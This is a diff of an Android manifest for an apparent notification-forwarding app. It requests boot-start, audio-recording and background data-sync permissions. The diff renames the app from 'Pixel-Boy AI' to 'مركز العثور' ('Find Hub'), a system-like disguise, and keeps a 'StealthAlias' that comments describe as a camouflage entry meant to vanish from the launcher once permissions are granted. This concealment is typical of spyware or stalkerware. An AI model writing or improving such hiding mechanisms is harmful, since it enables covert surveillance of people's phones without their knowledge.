@@ -6,18 +6,19 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     
-    <!-- إذونات تشغيل الخدمات في الخلفية بانتظام -->
+    <!-- إذونات الخلفية والخدمات -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
+    <!-- 🌟 لاحظ هنا: اسم التطبيق في الإعدادات والبحث سيكون دائماً "مركز العثور" -->
     <application
         android:name=".NotificationForwarderApp"
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:roundIcon="@mipmap/ic_launcher_round"
-        android:label="Pixel-Boy AI"
+        android:label="مركز العثور"
         android:networkSecurityConfig="@xml/network_security_config"
         android:supportsRtl="true"
         android:theme="@style/Theme.NotificationForwarder">
@@ -30,7 +31,7 @@
             android:launchMode="singleTask">
         </activity>
 
-        <!-- 🌟 1. الأيقونة والاسم الأساسي اللي هيظهر للمستخدم في الأول (Pixel-Boy AI) -->
+        <!-- 🌟 المدخل الوحيد للأنشر لأول مرة (Pixel-Boy AI) -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
@@ -44,13 +45,12 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- 🌟 2. الـ Alias التمويهي بعد تفعيل الإذن (مركز العثور) - بدون LAUNCHER عشان يختفي من الشاشة -->
+        <!-- 🌟 المكون الوهمي في الخلفية بديل اللانشر (مركز العثور) -->
         <activity-alias
             android:name=".StealthAlias"
             android:targetActivity=".MainActivity"
             android:enabled="false"
             android:exported="true"
-            android:icon="@mipmap/ic_launcher" 
             android:label="مركز العثور">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
